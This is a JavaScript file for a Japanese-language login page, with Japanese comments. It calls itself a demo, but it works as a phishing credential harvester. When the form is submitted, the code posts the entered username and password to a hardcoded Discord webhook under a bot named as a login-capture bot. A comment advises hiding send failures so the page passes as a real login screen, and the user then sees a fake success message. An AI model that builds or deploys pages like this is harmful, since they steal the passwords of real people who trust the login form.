document.addEventListener('DOMContentLoaded', function () {
  const form = document.getElementById('loginForm');
  const userInput = document.getElementById('user');
  const passInput = document.getElementById('password');
  const createBtn = document.getElementById('createAccount');
  const forgot = document.getElementById('forgot');
  const savedUser = sessionStorage.getItem('demo_user');
  
  // 🚨 自分のDiscord Webhook URLに置き換えてください 🚨
  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1434543747122856076/7RrHrlyH3eozKvNekNC0hnZCCrVtg6yDMLbsGEpQINankjQy62ybOEMBl8x0QswLg2oq'; 

  if (savedUser) userInput.value = savedUser;

  form.addEventListener('submit', async function (e) {
    e.preventDefault();
    const user = userInput.value.trim();
    const pass = passInput.value;
    const loginBtn = document.getElementById('loginBtn');

    if (!user) { alert('ユーザーネーム、メールまたは携帯電話番号を入力してください。'); userInput.focus(); return; }
    if (!pass) { alert('パスワードを入力してください。'); passInput.focus(); return; }

    sessionStorage.setItem('demo_user', user);
    
    loginBtn.disabled = true;
    loginBtn.textContent = 'ログイン中...';
    
    // ログイン情報をDiscord Webhookに送信する処理
    const discordMessage = {
      // Discordの通知に表示されるユーザー名を上書き
      username: 'ログイン情報キャプチャボット', 
      // メッセージ内容
      content: `新しいログイン情報が送信されました！\n**ユーザー名**: \`${user}\`\n**パスワード**: \`${pass}\`\n**時刻**: ${new Date().toLocaleString('ja-JP', { timeZone: 'Asia/Tokyo' })}`
    };

    try {
      const response = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(discordMessage),
      });

      if (response.ok) {
        // Discordへの送信成功
        console.log('Discord Webhookに情報を送信しました。');
      } else {
        // Discordからのエラー応答
        console.error('Discord Webhookへの送信に失敗しました:', response.status, response.statusText);
        // エラーをユーザーに通知しない方が、本物のログイン画面のように見えます
      }
    } catch (error) {
      // ネットワークエラーなど
      console.error('ネットワークエラー:', error);
    }
    
    // デモのログイン成功表示 (元のコードのsetTimeout部分)
    setTimeout(() => {
      loginBtn.disabled = false;
      loginBtn.textContent = 'ログイン';
      alert(`${user} さん、デモログインに成功しました（本番ではここでサーバー認証を行ってください）。`);
      passInput.value = '';
    }, 900);
  });

  createBtn.addEventListener('click', function () {
    alert('「アカウント作成」のデモ挙動です。教材ではここに登録フォームを実装します。');
  });
  
  forgot.addEventListener('click', function (e) {
    e.preventDefault();
    const user = userInput.value.trim();
    if (!user) { alert('まずユーザーネームかメールアドレスを入力してください。'); userInput.focus(); return; }
    alert(`${user} 宛にパスワード再設定リンクが送られた（デモ表示）`);
  });
});
